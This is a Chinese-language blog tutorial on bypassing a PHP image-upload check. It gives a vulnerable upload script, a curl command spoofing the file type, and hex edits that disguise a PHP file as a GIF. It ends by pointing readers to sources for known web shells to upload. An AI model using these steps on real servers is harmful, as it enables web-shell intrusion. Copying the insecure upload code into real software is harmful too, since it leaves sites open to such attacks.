---
layout : post
title : PHP上传shell注入(一)
category : php
---

 1. 首先准备上传文件phpinfo.php

{% highlight php %}
<?php
    echo phpinfo();

{% endhighlight %}

 2. 上传文件脚本fileup.php

{% highlight php %}
        <?php                                                                
         $valid_types = array('image/jpeg','image/jpg','image/gif','image/png');
         if(isset($_FILES['filedata']))
         {
           if(is_uploaded_file($_FILES['filedata']['tmp_name'])&&in_array($_FILES['filedata']['type'],$valid_types))
          {
           $new_filename = "/var/www/test/f_image_".$_FILES['filedata']['name'];
          $uploaded = move_uploaded_file($_FILES['filedata']['tmp_name'],$new_filename);
          }
                  if($uploaded)
                  {
                          if($image = getimagesize($new_filename))
                          {
                                  print_r($image);
                          }
                          else
                          {
                                  echo "Bad image resource";
                          }
                 }
                else
                {
                          echo "not uploaded!";
                  }
         }

{% endhighlight %}
 3. CURL命令行上传（方便操作）
{% highlight php %}
        curl \ 
        --form 'any_post_data=value' \ 
        --form 'filedata=@phpinfo.php;filename=phpinfo.php; type=image/gif' 
        'http://localhost/test/fileup.php' 
{% endhighlight %}
    curl 模拟一个post请求，具体看man curl

    经过上面的准备工作，及第三步请求，我们得到一个反馈：

    ![enter image description here](http://akulubala.github.io/public/images/2014/web_shell_1.png)

    说上传的文件不是image



    接下来关键点来了.

 4. 修改phpinfo.php 让它变成image
 
    首先需要一个可以查看2进制(16进制)文件的工具。linux 下面 vim可以直接使用系统的xxd(
    也可以下载hexedit来查看)：  

    首先使用file phpinfo.php  得到结果
{% highlight php%}
        ray@ubuntu:/var/www/test$ file phpinfo.php 
        phpinfo.php: PHP script, ASCII text->这里是命令行结果,太小不截图了
{% endhighlight %}
    使用vim 查看一个gif文件：

        vim -b filename.gif //-b选项不加查看的时候会自动加上0x0a回城符
        :%!xxd
        //查看完了需要使用%！xxd -r 是还原二进制文件到文本模式

    执行完上面两步后：

    ![enter image description here](http://akulubala.github.io/public/images/2014/web_shell_2.png)

    看到最后一栏有GIF89a的字样，这个就是gif标识文件格式的地方。  
    打开phpinfo.php
    再第一行加入GIF89a几个字符(也可以编辑头六个字节：47 49 46
    38 39 61，建议使用GHex)，注意这里使用编辑器编辑最好是替换，因为二进制文件排列是紧密的块形式    
    然后再使用file phpinfo.php命令查看得到： 

        ray@ubuntu:/var/www/test$ file phpinfo.php 
        phpinfo.php: GIF image data, version 89a, 15370 x 28735

    看来文件已经变成了GIF了但是文件大小却不对，从<a href="http://en.wikipedia.org/wiki/Graphics_Interchange_Format">gif wiki</a>
    上看到头六个字节表示GIF89a，第7,8（000006-000007），9,10(000008,000009)个字节表示图片大小
    
        6:     03 00        3            - logical screen width in pixels
        8:     05 00        5            - logical screen height in pixels

    更改想要的大小如0001,0001，再使用file 查看文件大小就变成了"1\*1"了
    
    更改完成再次进行第三步中的curl操作，可以发现已经可以正常上传这个假的图片文件了。
    
    更改PNG文件类似，但是PNG的头信息和gif不同：  

        文件头：由八个字节组成，0x89504e470d0a1a0a
        数据块：每个数据块由四部分构成，他们的描述依次如下：
        Length ：占四字节，表示数据块data域占多少个字节。（注意这里不包括length自身）
        Type ：占四字节，表示当前块的类型。一般是英文大小写字母的ASCII码（65～9>0或者97～122）
        Data：数据区。大小可以是0字节
        CRC：占四个字节，整个chunk的CRC校验码（Length+Type+Data） 

    ![enter image description here](http://akulubala.github.io/public/images/2014/web_shell_3.png)

    除去头文件信息是第一行前八个字节外，其他信息依次4个字节表示

 5. 上传真正的shell脚本

    出名的shell脚本从这里可以找到：  
    http://www.r57shell.net/  
    里面有个C999的源码翻译过来的  
    http://mikeybeck.com/hacking/viewC999.php

    今天就到这里吧...好困了。。


